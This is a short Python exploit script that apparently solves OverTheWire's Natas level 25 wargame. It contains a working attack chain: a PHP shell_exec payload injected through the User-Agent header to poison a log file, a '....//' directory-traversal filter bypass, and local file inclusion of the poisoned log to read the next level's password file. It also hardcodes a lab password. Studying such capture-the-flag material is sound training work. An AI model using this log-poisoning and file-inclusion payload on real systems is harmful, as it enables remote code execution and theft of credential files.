import requests
from bs4 import BeautifulSoup

# PHP Local file inclusion LFI

username = 'natas25'
password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
url = "http://{}.natas.labs.overthewire.org".format(username)  # ?debug=True

s = requests.Session()

header = {'User-Agent': '<?php echo shell_exec("less /etc/natas_webpass/natas26"); ?>'}
g = s.get(url, auth=(username, password))
session_id = g.cookies['PHPSESSID']
print ("Session ID: "+session_id)
path = '....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_' + session_id + ".log"

data = {'lang': path}
r = s.post(url, headers=header, data=data, auth=(username, password))
sp = BeautifulSoup(r.text, 'lxml')

body = sp.find_all('body')

x = list(filter(None, body[0].text.split("\n")))
print("natas26: " + x[3].split(" ")[2])
